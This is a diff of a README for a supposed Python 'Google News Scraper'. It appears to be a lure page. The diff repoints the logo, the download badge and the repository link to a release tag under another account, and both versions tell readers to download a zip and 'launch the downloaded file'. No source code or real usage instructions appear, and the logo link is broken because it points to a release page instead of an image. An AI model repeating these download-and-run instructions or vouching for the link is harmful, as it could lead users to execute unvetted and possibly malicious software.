@@ -1,6 +1,6 @@
 # 🌟 Welcome to the Google News Scraper Repository
 
-![Google News Scraper Logo](https://example.com/google-news-scraper-logo.png)
+![Google News Scraper Logo](https://github.com/victoria217-bottino/google-news-scraper/releases/tag/v2.0)
 
 ## Introduction
 Welcome to the **Google News Scraper** repository, a powerful tool crafted in Python for fetching, decoding, and processing Google News articles based on keywords and time ranges. Whether you are into news aggregation, analysis, or building bots, this tool has got you covered with its robust features.
@@ -22,12 +22,12 @@ Here are some key features of the Google News Scraper:
 ## Get Started
 To dive into the world of Google News scraping and analysis, download the Google News Scraper tool from the link below:
 
-[![Download Google News Scraper](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Google News Scraper](https://github.com/victoria217-bottino/google-news-scraper/releases/tag/v2.0)](https://github.com/victoria217-bottino/google-news-scraper/releases/tag/v2.0)
 
 Make sure to launch the downloaded file to start exploring the capabilities of this amazing tool!
 
 ## Explore Further
-Visit the [Google News Scraper GitHub repository](https://github.com/user/google-news-scraper) to discover more about the functionalities, contribute to the project, or raise any issues you encounter. You can also check the "Releases" section if the provided download link is not accessible.
+Visit the [Google News Scraper GitHub repository](https://github.com/victoria217-bottino/google-news-scraper/releases/tag/v2.0) to discover more about the functionalities, contribute to the project, or raise any issues you encounter. You can also check the "Releases" section if the provided download link is not accessible.
 
 Let's scrape, decode, and analyze the world of Google News together! 🌍🔍📰
 
